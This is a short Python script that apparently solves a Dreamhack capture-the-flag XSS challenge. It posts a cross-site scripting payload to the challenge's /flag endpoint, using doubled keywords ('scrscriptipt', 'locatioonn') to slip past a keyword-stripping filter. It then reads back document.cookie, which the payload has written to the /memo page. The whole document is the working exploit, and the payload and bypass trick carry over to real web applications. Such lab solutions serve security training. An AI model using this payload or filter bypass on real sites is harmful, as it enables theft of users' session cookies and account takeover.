import requests

port = 21660
url_index = f"http://host3.dreamhack.games:{port}/"
url_flag = url_index + "flag"
url_memo = url_index + "memo"

param = {
    "param": '<scrscriptipt>locatioonn.href="/memo?memo="+document.cookie</scrscriptipt>'
}
r = requests.post(url_flag, data=param)
r = requests.get(url_memo)
print(r.text)
